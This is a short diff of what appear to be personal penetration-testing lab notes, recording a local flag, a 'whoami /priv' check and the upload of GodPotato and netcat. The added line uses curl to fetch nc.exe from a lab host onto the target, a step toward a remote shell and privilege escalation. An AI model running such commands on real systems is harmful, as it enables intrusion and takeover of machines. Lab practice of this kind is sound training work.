@@ -100,6 +100,8 @@ got local flag
 whoami /priv
 uploaded GodPotato and nc
 
+curl http://192.168.49.102/nc.exe -o nc.exe
+
 
 
 
